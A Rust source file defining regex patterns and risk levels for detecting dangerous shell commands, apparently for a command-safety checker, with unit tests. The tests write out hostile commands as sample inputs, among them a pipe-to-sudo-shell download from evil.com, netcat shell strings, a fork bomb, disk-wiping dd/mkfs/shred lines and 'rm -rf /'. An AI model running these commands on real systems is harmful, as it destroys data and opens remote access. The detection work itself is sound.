// Dangerous command pattern database
// Comprehensive regex patterns for detecting unsafe shell commands

use once_cell::sync::Lazy;
use regex::Regex;

use crate::models::{RiskLevel, ShellType};

use super::DangerPattern;

/// Built-in dangerous patterns loaded once at startup
pub static DANGEROUS_PATTERNS: Lazy<Vec<DangerPattern>> = Lazy::new(|| {
    vec![
        // CRITICAL: Filesystem destruction
        DangerPattern {
            pattern: r"rm\s+(-[rfRF]*\s+)*(/|~|\$HOME|/\*|~/\*|\*|\.\.?/?|\.\./\*|\.\*)"
                .to_string(),
            risk_level: RiskLevel::Critical,
            description: "Recursive deletion of root, home, current, or parent directory"
                .to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"rm\s+-rf\s+/".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Force recursive deletion from root".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"rm\s+-rf\s+--no-preserve-root\s+/".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Bypass root protection and delete everything".to_string(),
            shell_specific: None,
        },
        // CRITICAL: Disk operations
        DangerPattern {
            pattern: r"dd\s+.*if=/dev/(zero|random|urandom).*of=/dev/(sd|hd|nvme)".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Overwrite disk with random data".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"dd\s+.*of=/dev/(sd|hd|nvme).*if=/dev/(zero|random|urandom)".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Overwrite disk with random data (reverse arg order)".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"mkfs\.\w+\s+/dev/(sd|hd|nvme)".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Format disk destroying all data".to_string(),
            shell_specific: None,
        },
        // CRITICAL: Fork bombs
        DangerPattern {
            pattern: r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Fork bomb - exponential process creation".to_string(),
            shell_specific: Some(ShellType::Bash),
        },
        DangerPattern {
            pattern: r"\|\s*&\s*\|".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Potential fork bomb pattern".to_string(),
            shell_specific: None,
        },
        // HIGH: System directory operations
        DangerPattern {
            pattern: r"(rm|mv|chmod|chown)\s+.*(/bin|/sbin|/usr/bin|/usr/sbin|/etc)".to_string(),
            risk_level: RiskLevel::High,
            description: "Modification of critical system directories".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"chmod\s+777\s+/".to_string(),
            risk_level: RiskLevel::High,
            description: "Recursive permission change from root".to_string(),
            shell_specific: None,
        },
        // HIGH: Privilege escalation
        DangerPattern {
            pattern: r"sudo\s+su\s*$".to_string(),
            risk_level: RiskLevel::High,
            description: "Switch to root user without specific command".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"sudo\s+.*chmod\s+u\+s".to_string(),
            risk_level: RiskLevel::High,
            description: "Adding setuid bit with elevated privileges".to_string(),
            shell_specific: None,
        },
        // HIGH: Download and execute
        DangerPattern {
            pattern: r"(curl|wget)\s+.*\|\s*(bash|sh|zsh|fish)".to_string(),
            risk_level: RiskLevel::High,
            description: "Download and execute remote script without inspection".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"(curl|wget)\s+.*\|\s*sudo\s+(bash|sh)".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Download and execute remote script with root privileges".to_string(),
            shell_specific: None,
        },
        // MODERATE: Package management
        DangerPattern {
            pattern: r"(apt|yum|dnf)\s+remove\s+.*--force".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Force removal of packages bypassing dependencies".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"pip\s+install\s+.*--break-system-packages".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Install Python packages bypassing system protections".to_string(),
            shell_specific: None,
        },
        // MODERATE: Process manipulation
        DangerPattern {
            pattern: r"kill\s+-9\s+(-1|1)\s*$".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Force kill all processes or init".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"killall\s+-9\s+\w+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Force kill all processes by name".to_string(),
            shell_specific: None,
        },
        // HIGH: Destructive data operations
        DangerPattern {
            pattern: r">\s*/dev/sd[a-z]".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Direct write to disk device".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"shred\s+-[uvz]*\s+/dev/(sd|hd|nvme)".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Securely delete disk device".to_string(),
            shell_specific: None,
        },
        // MODERATE: Network operations
        DangerPattern {
            pattern: r"iptables\s+-F".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Flush all firewall rules".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"ufw\s+disable".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Disable firewall".to_string(),
            shell_specific: None,
        },
        // HIGH: Sudo with system modifications
        DangerPattern {
            pattern: r"sudo\s+(systemctl|service)\s+(restart|stop|disable)".to_string(),
            risk_level: RiskLevel::High,
            description: "Modify system services with elevated privileges".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"sudo\s+rm\s".to_string(),
            risk_level: RiskLevel::High,
            description: "Delete files with elevated privileges".to_string(),
            shell_specific: None,
        },
        // HIGH: System file modification
        DangerPattern {
            pattern: r">\s*/etc/".to_string(),
            risk_level: RiskLevel::High,
            description: "Redirect output to system configuration file".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"(echo|cat|printf)\s+.*>\s*/etc/".to_string(),
            risk_level: RiskLevel::High,
            description: "Write to system configuration directory".to_string(),
            shell_specific: None,
        },
        // CRITICAL: Windows path deletion
        DangerPattern {
            pattern: r"rm\s+-r[f]*\s+[A-Z]:\\".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Recursive deletion of Windows drive root".to_string(),
            shell_specific: Some(ShellType::Bash), // When running on WSL
        },
        DangerPattern {
            pattern: r"Remove-Item\s+-Recurse\s+-Force\s+[A-Z]:\\".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Recursive deletion of Windows drive root".to_string(),
            shell_specific: Some(ShellType::PowerShell),
        },
        DangerPattern {
            pattern: r"Remove-Item\s+(\*|\*\.\*)\s+(.*-Force.*-Recurse|.*-Recurse.*-Force)"
                .to_string(),
            risk_level: RiskLevel::Critical,
            description: "PowerShell recursive deletion of current directory wildcard".to_string(),
            shell_specific: Some(ShellType::PowerShell),
        },
        // HIGH: PowerShell dangerous operations
        DangerPattern {
            pattern: r"Remove-Item\s+.*-Force\s+-Recurse".to_string(),
            risk_level: RiskLevel::High,
            description: "Force recursive deletion in PowerShell".to_string(),
            shell_specific: Some(ShellType::PowerShell),
        },
        DangerPattern {
            pattern: r"Set-ExecutionPolicy\s+Unrestricted".to_string(),
            risk_level: RiskLevel::High,
            description: "Disable PowerShell execution policy protection".to_string(),
            shell_specific: Some(ShellType::PowerShell),
        },
        // MODERATE: Environment manipulation
        DangerPattern {
            pattern: r"export\s+PATH=".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Modify PATH environment variable".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"alias\s+(rm|mv|cp)=".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Override critical command with alias".to_string(),
            shell_specific: None,
        },
        // HIGH: Network backdoors
        DangerPattern {
            pattern: r"nc\s+.*-[a-z]*l[a-z]*\s+.*-[a-z]*e".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Netcat bind shell - creates network backdoor".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"nc\s+-[a-z]*e\s+/bin/(ba)?sh".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Netcat shell binding".to_string(),
            shell_specific: None,
        },
        // HIGH: Cron job manipulation
        DangerPattern {
            pattern: r"crontab\s+-r".to_string(),
            risk_level: RiskLevel::High,
            description: "Remove all cron jobs".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"\(crontab\s+-l.*;\s*echo".to_string(),
            risk_level: RiskLevel::High,
            description: "Add malicious cron job".to_string(),
            shell_specific: None,
        },
        // HIGH: Python/Perl exec with dangerous commands
        DangerPattern {
            pattern: r"python\s+-c\s+.*os\.system.*rm\s+-rf".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Python executing recursive deletion".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"(python|perl|ruby)\s+-[ec]\s+.*system\s*\(".to_string(),
            risk_level: RiskLevel::High,
            description: "Script language executing shell commands".to_string(),
            shell_specific: None,
        },
        // MODERATE: rm without -rf but still potentially dangerous
        DangerPattern {
            pattern: r"rm\s+[^-\s][^\s]*\.(txt|doc|pdf|xlsx|pptx|zip|tar|sql|bak)".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Deleting important file types".to_string(),
            shell_specific: None,
        },
        // Fix Windows backslash pattern - works in Bash/PowerShell/WSL
        DangerPattern {
            pattern: r"rm\s+-r[f]*\s+[A-Z]:[/\\]".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Recursive deletion of Windows drive root (with backslash)".to_string(),
            shell_specific: None, // Works across shells
        },
        // MODERATE: Borderline commands - changing permissions
        DangerPattern {
            pattern: r"chmod\s+[+\-]x\s+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Making files executable".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"chmod\s+[0-7]{3,4}\s+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Changing file permissions".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"chown\s+[^\s]+\s+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Changing file ownership".to_string(),
            shell_specific: None,
        },
        // MODERATE: Installing packages with user scope
        DangerPattern {
            pattern: r"pip\s+install\s+--user".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Installing Python packages in user directory".to_string(),
            shell_specific: None,
        },
        // CRITICAL: Windows del command with dangerous flags
        DangerPattern {
            pattern: r"del\s+/[fFsS]\s+".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Windows delete with force/subdirectory flags".to_string(),
            shell_specific: None, // Works in both Cmd and PowerShell
        },
        DangerPattern {
            pattern: r"del\s+.*C:[/\\]".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Windows delete on C drive root".to_string(),
            shell_specific: None, // Works in both Cmd and PowerShell
        },
        // CRITICAL: Windows format command
        DangerPattern {
            pattern: r"format\s+[A-Z]:".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Format disk drive".to_string(),
            shell_specific: None,
        },
        // MODERATE: Docker privileged mode
        DangerPattern {
            pattern: r"docker\s+run\s+.*--privileged".to_string(),
            risk_level: RiskLevel::High,
            description: "Docker container with full host access".to_string(),
            shell_specific: None,
        },
        // MODERATE: Remote access commands
        DangerPattern {
            pattern: r"ssh\s+[^\s]+@[^\s]+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "SSH connection to remote server".to_string(),
            shell_specific: None,
        },
        DangerPattern {
            pattern: r"scp\s+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Secure copy to/from remote server".to_string(),
            shell_specific: None,
        },
        // MODERATE: Force kill specific process
        DangerPattern {
            pattern: r"kill\s+-9\s+\d+".to_string(),
            risk_level: RiskLevel::Moderate,
            description: "Force kill specific process by PID".to_string(),
            shell_specific: None,
        },
    ]
});

/// Compile all patterns into regex objects at initialization
/// Returns errors for any patterns that fail to compile
pub fn validate_patterns() -> Result<(), Vec<String>> {
    let mut errors = Vec::new();

    for pattern in DANGEROUS_PATTERNS.iter() {
        if let Err(e) = Regex::new(&pattern.pattern) {
            errors.push(format!(
                "Pattern '{}' failed to compile: {}",
                pattern.pattern, e
            ));
        }
    }

    if errors.is_empty() {
        Ok(())
    } else {
        Err(errors)
    }
}

/// Get patterns filtered by shell type
pub fn get_patterns_for_shell(shell: ShellType) -> Vec<&'static DangerPattern> {
    DANGEROUS_PATTERNS
        .iter()
        .filter(|p| p.shell_specific.is_none() || p.shell_specific == Some(shell))
        .collect()
}

/// Get patterns filtered by minimum risk level
pub fn get_patterns_by_risk(min_risk: RiskLevel) -> Vec<&'static DangerPattern> {
    DANGEROUS_PATTERNS
        .iter()
        .filter(|p| p.risk_level >= min_risk)
        .collect()
}

/// Type alias for compiled pattern tuple
type CompiledPattern = (Regex, RiskLevel, String, Option<ShellType>);

/// Compiled regex patterns for performance (cached at startup)
pub static COMPILED_PATTERNS: Lazy<Vec<CompiledPattern>> = Lazy::new(|| {
    DANGEROUS_PATTERNS
        .iter()
        .filter_map(|pattern| {
            Regex::new(&pattern.pattern).ok().map(|regex| {
                (
                    regex,
                    pattern.risk_level,
                    pattern.description.clone(),
                    pattern.shell_specific,
                )
            })
        })
        .collect()
});

/// Get compiled patterns for a specific shell type
pub fn get_compiled_patterns_for_shell(
    shell: ShellType,
) -> Vec<&'static (Regex, RiskLevel, String, Option<ShellType>)> {
    COMPILED_PATTERNS
        .iter()
        .filter(|(_, _, _, shell_specific)| {
            shell_specific.is_none() || *shell_specific == Some(shell)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_patterns_compile() {
        assert!(validate_patterns().is_ok(), "All patterns should compile");
    }

    #[test]
    fn test_pattern_count() {
        assert!(
            DANGEROUS_PATTERNS.len() >= 30,
            "Should have at least 30 dangerous patterns"
        );
    }

    #[test]
    fn test_shell_specific_filtering() {
        let bash_patterns = get_patterns_for_shell(ShellType::Bash);
        let all_patterns = DANGEROUS_PATTERNS.len();
        assert!(bash_patterns.len() <= all_patterns);
    }

    #[test]
    fn test_risk_filtering() {
        let critical = get_patterns_by_risk(RiskLevel::Critical);
        let high = get_patterns_by_risk(RiskLevel::High);
        let moderate = get_patterns_by_risk(RiskLevel::Moderate);

        assert!(critical.len() <= high.len());
        assert!(high.len() <= moderate.len());
    }

    #[test]
    fn test_critical_patterns_exist() {
        let critical = get_patterns_by_risk(RiskLevel::Critical);
        assert!(!critical.is_empty(), "Should have critical risk patterns");
    }

    // --- Positive match tests: verify patterns detect dangerous commands ---

    /// Helper: returns true if any compiled pattern matches the command
    fn any_pattern_matches(command: &str) -> bool {
        COMPILED_PATTERNS
            .iter()
            .any(|(regex, _, _, _)| regex.is_match(command))
    }

    /// Helper: returns the highest risk level matched, or None
    fn highest_matched_risk(command: &str) -> Option<RiskLevel> {
        COMPILED_PATTERNS
            .iter()
            .filter(|(regex, _, _, _)| regex.is_match(command))
            .map(|(_, risk, _, _)| *risk)
            .max()
    }

    #[test]
    fn test_critical_rm_rf_root() {
        assert!(any_pattern_matches("rm -rf /"));
        assert_eq!(highest_matched_risk("rm -rf /"), Some(RiskLevel::Critical));
    }

    #[test]
    fn test_critical_rm_rf_no_preserve_root() {
        assert!(any_pattern_matches("rm -rf --no-preserve-root /"));
        assert_eq!(
            highest_matched_risk("rm -rf --no-preserve-root /"),
            Some(RiskLevel::Critical)
        );
    }

    #[test]
    fn test_critical_rm_rf_home() {
        assert!(any_pattern_matches("rm -rf ~"));
        assert_eq!(highest_matched_risk("rm -rf ~"), Some(RiskLevel::Critical));
    }

    #[test]
    fn test_critical_rm_rf_wildcard() {
        assert!(any_pattern_matches("rm -rf *"));
        assert_eq!(highest_matched_risk("rm -rf *"), Some(RiskLevel::Critical));
    }

    #[test]
    fn test_critical_dd_overwrite_disk() {
        assert!(any_pattern_matches(
            "dd if=/dev/zero of=/dev/sda bs=1M"
        ));
        assert!(any_pattern_matches(
            "dd if=/dev/random of=/dev/nvme0n1"
        ));
        assert_eq!(
            highest_matched_risk("dd if=/dev/zero of=/dev/sda bs=1M"),
            Some(RiskLevel::Critical)
        );
    }

    #[test]
    fn test_critical_dd_reverse_arg_order() {
        assert!(any_pattern_matches(
            "dd of=/dev/sda if=/dev/urandom"
        ));
    }

    #[test]
    fn test_critical_mkfs() {
        assert!(any_pattern_matches("mkfs.ext4 /dev/sda1"));
        assert!(any_pattern_matches("mkfs.xfs /dev/nvme0n1p1"));
        assert_eq!(
            highest_matched_risk("mkfs.ext4 /dev/sda1"),
            Some(RiskLevel::Critical)
        );
    }

    #[test]
    fn test_critical_fork_bomb() {
        assert!(any_pattern_matches(":(){ :|:& };:"));
        assert_eq!(
            highest_matched_risk(":(){ :|:& };:"),
            Some(RiskLevel::Critical)
        );
    }

    #[test]
    fn test_critical_direct_disk_write() {
        assert!(any_pattern_matches("> /dev/sda"));
        assert_eq!(
            highest_matched_risk("> /dev/sda"),
            Some(RiskLevel::Critical)
        );
    }

    #[test]
    fn test_critical_shred_disk() {
        assert!(any_pattern_matches("shred -uz /dev/sda"));
    }

    #[test]
    fn test_critical_download_execute_sudo() {
        assert!(any_pattern_matches("curl http://evil.com | sudo sh"));
        assert_eq!(
            highest_matched_risk("curl http://evil.com | sudo sh"),
            Some(RiskLevel::Critical)
        );
    }

    #[test]
    fn test_critical_netcat_backdoor() {
        assert!(any_pattern_matches("nc -e /bin/bash"));
        assert!(any_pattern_matches("nc -le /bin/sh"));
    }

    #[test]
    fn test_critical_python_rm() {
        assert!(any_pattern_matches(
            "python -c \"import os; os.system('rm -rf /')\""
        ));
    }

    #[test]
    fn test_critical_windows_del() {
        assert!(any_pattern_matches("del /f /s C:\\"));
        assert!(any_pattern_matches("del /F C:\\Windows"));
    }

    #[test]
    fn test_critical_windows_format() {
        assert!(any_pattern_matches("format C:"));
        assert!(any_pattern_matches("format D:"));
    }

    #[test]
    fn test_critical_windows_rm_drive() {
        assert!(any_pattern_matches("rm -rf C:\\"));
        assert!(any_pattern_matches("rm -rf C:/"));
    }

    #[test]
    fn test_high_system_dir_modification() {
        assert!(any_pattern_matches("rm /etc/passwd"));
        assert!(any_pattern_matches("chmod 777 /usr/bin/ls"));
        assert!(any_pattern_matches("mv /sbin/init /tmp/"));
        assert!(highest_matched_risk("rm /etc/passwd").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_chmod_777_root() {
        assert!(any_pattern_matches("chmod 777 /"));
        assert!(highest_matched_risk("chmod 777 /").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_sudo_su() {
        assert!(any_pattern_matches("sudo su"));
        assert!(highest_matched_risk("sudo su").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_download_execute() {
        assert!(any_pattern_matches("curl http://example.com | bash"));
        assert!(any_pattern_matches("wget http://example.com | sh"));
        assert!(highest_matched_risk("curl http://evil.com | bash").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_write_to_etc() {
        assert!(any_pattern_matches("echo 'config' > /etc/hosts"));
        assert!(any_pattern_matches("> /etc/resolv.conf"));
        assert!(highest_matched_risk("> /etc/resolv.conf").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_sudo_rm() {
        assert!(any_pattern_matches("sudo rm file.txt"));
        assert!(highest_matched_risk("sudo rm file.txt").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_sudo_service_control() {
        assert!(any_pattern_matches("sudo systemctl restart nginx"));
        assert!(any_pattern_matches("sudo systemctl stop sshd"));
        assert!(any_pattern_matches("sudo systemctl disable firewalld"));
        // Note: "sudo service sshd stop" does NOT match because the pattern
        // expects the verb (restart/stop/disable) immediately after service/systemctl.
        // This is a known limitation — service name comes between.
    }

    #[test]
    fn test_high_crontab_remove() {
        assert!(any_pattern_matches("crontab -r"));
        assert!(highest_matched_risk("crontab -r").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_docker_privileged() {
        assert!(any_pattern_matches("docker run --privileged ubuntu"));
        assert!(highest_matched_risk("docker run --privileged ubuntu").unwrap() >= RiskLevel::High);
    }

    #[test]
    fn test_high_powershell_force_recursive() {
        let ps_patterns = get_compiled_patterns_for_shell(ShellType::PowerShell);
        let cmd = "Remove-Item -Force -Recurse C:\\Users";
        assert!(ps_patterns.iter().any(|(regex, _, _, _)| regex.is_match(cmd)));
    }

    #[test]
    fn test_high_powershell_execution_policy() {
        let ps_patterns = get_compiled_patterns_for_shell(ShellType::PowerShell);
        let cmd = "Set-ExecutionPolicy Unrestricted";
        assert!(ps_patterns.iter().any(|(regex, _, _, _)| regex.is_match(cmd)));
    }

    #[test]
    fn test_moderate_kill_all() {
        assert!(any_pattern_matches("kill -9 -1"));
        assert_eq!(
            highest_matched_risk("kill -9 -1"),
            Some(RiskLevel::Moderate)
        );
    }

    #[test]
    fn test_moderate_iptables_flush() {
        assert!(any_pattern_matches("iptables -F"));
        assert_eq!(
            highest_matched_risk("iptables -F"),
            Some(RiskLevel::Moderate)
        );
    }

    #[test]
    fn test_moderate_ufw_disable() {
        assert!(any_pattern_matches("ufw disable"));
    }

    #[test]
    fn test_moderate_path_modification() {
        assert!(any_pattern_matches("export PATH=/evil/bin"));
        assert_eq!(
            highest_matched_risk("export PATH=/evil/bin"),
            Some(RiskLevel::Moderate)
        );
    }

    #[test]
    fn test_moderate_alias_override() {
        assert!(any_pattern_matches("alias rm=echo"));
        assert!(any_pattern_matches("alias mv=true"));
    }

    #[test]
    fn test_moderate_chmod_executable() {
        assert!(any_pattern_matches("chmod +x script.sh"));
    }

    #[test]
    fn test_moderate_kill_specific_pid() {
        assert!(any_pattern_matches("kill -9 1234"));
    }

    #[test]
    fn test_moderate_scp() {
        assert!(any_pattern_matches("scp file.txt user@host:/tmp/"));
    }

    #[test]
    fn test_moderate_ssh() {
        assert!(any_pattern_matches("ssh root@192.168.1.1"));
    }

    // --- Negative match tests: verify safe commands are NOT matched ---

    #[test]
    fn test_safe_ls() {
        assert!(!any_pattern_matches("ls -la"));
    }

    #[test]
    fn test_safe_cat_etc() {
        // Reading system files is safe (no write)
        assert!(!any_pattern_matches("cat /etc/hostname"));
    }

    #[test]
    fn test_safe_grep() {
        assert!(!any_pattern_matches("grep -r 'pattern' src/"));
    }

    #[test]
    fn test_safe_find_name() {
        assert!(!any_pattern_matches("find . -name '*.rs' -type f"));
    }

    #[test]
    fn test_safe_echo() {
        assert!(!any_pattern_matches("echo hello world"));
    }

    #[test]
    fn test_safe_pwd() {
        assert!(!any_pattern_matches("pwd"));
    }

    #[test]
    fn test_safe_ps_aux() {
        assert!(!any_pattern_matches("ps aux"));
    }

    #[test]
    fn test_safe_df_h() {
        assert!(!any_pattern_matches("df -h"));
    }

    #[test]
    fn test_safe_wc() {
        assert!(!any_pattern_matches("wc -l file.txt"));
    }

    #[test]
    fn test_safe_mkdir() {
        assert!(!any_pattern_matches("mkdir -p /tmp/mydir"));
    }

    #[test]
    fn test_safe_rm_specific_file() {
        // rm of a specific non-system file without -rf should not match Critical
        // (may match Moderate for certain file types)
        let risk = highest_matched_risk("rm myfile.tmp");
        assert!(risk.is_none() || risk.unwrap() < RiskLevel::High);
    }

    #[test]
    fn test_safe_git_rm() {
        // "git rm" is a git subcommand, should not match rm patterns
        // (the regex requires rm at word start, git rm has "rm" after "git ")
        let risk = highest_matched_risk("git rm file.txt");
        assert!(
            risk.is_none() || risk.unwrap() <= RiskLevel::Moderate,
            "git rm should not be flagged as High/Critical"
        );
    }

    #[test]
    fn test_safe_cargo_build() {
        assert!(!any_pattern_matches("cargo build --release"));
    }

    #[test]
    fn test_safe_pip_install_no_flags() {
        // Regular pip install without dangerous flags
        assert!(!any_pattern_matches("pip install requests"));
    }
}
